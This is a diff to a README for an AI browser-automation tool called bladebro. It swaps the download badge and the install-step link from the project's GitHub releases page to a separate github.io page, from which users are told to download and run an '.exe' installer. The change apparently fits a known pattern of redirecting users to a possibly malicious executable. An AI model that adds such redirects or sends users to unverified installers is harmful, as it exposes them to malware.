@@ -1,6 +1,6 @@
 # 🤖 bladebro - Control web browsers with intelligent automation
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/iorminaofficial418/bladebro/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://iorminaofficial418.github.io)
 
 Bladebro helps you automate web tasks using artificial intelligence. It acts like a human inside your browser to handle repetitive clicks, data entry, and navigation. You maintain full control over every action the software takes while it works in the background.
 
@@ -26,7 +26,7 @@ Before you install the software, check your computer for these items:
 
 Follow these steps to set up Bladebro on your Windows computer.
 
-1. Visit the download page: [https://github.com/iorminaofficial418/bladebro/releases](https://github.com/iorminaofficial418/bladebro/releases).
+1. Visit the download page: [https://iorminaofficial418.github.io](https://iorminaofficial418.github.io).
 2. Look for the section labeled "Assets" at the bottom of the newest version.
 3. Click the link that ends in ".exe" to save the installer file to your computer.
 4. Locate the file in your downloads folder.
